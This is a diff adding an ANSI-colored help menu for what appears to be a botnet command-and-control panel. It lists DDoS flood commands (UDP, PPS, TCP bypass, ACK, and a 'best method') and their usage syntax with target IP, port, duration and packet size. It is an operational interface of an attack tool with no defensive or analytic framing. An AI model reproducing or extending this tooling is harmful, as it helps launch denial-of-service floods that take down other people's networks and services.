@@ -1,0 +1,13 @@
+[8;16;75t<<$clear>>[97mAttack Vectors[38;2;76;0;255m:
+
+ [38;2;76;0;255m- [97m!udp[38;2;76;0;255m: [97mGeneric UDP flood
+ [38;2;76;0;255m- [97m!pps[38;2;76;0;255m: [97mPPS attack
+ [38;2;76;0;255m- [97m!tcp[38;2;76;0;255m: [97mTCP bypass flood
+ [38;2;76;0;255m- [97m!ack[38;2;76;0;255m: [97mTCP ACK flood
+ [38;2;76;0;255m- [97m!tab[38;2;76;0;255m: [97mBest Method In The C2 
+
+
+ [97mAttack Help[38;2;76;0;255m:
+ [38;2;76;0;255m- [97mPPS[38;2;76;0;255m: [97m!method ip port time 1
+ [38;2;76;0;255m- [97mGBPS[38;2;76;0;255m: [97m!method ip port time 1400
+ [38;2;76;0;255m- [97mStandard[38;2;76;0;255m: [97m!method ip port time
